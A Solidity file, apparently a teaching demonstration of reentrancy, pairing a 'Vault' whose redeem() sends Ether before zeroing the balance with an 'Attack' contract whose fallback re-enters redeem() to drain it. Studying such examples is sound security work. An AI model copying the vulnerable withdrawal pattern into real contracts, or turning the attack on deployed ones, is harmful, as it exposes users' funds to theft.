// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

contract Vault {
    mapping(address => uint256) public balances;

    function store() public payable {
        balances[msg.sender] += msg.value;
    }

    function redeem() public {
        msg.sender.call{value: balances[msg.sender]}("");
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Vault public vault;

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    // Fallback is called when Vault sends Ether to this contract.
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.store{value: 1 ether}();
        vault.redeem();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
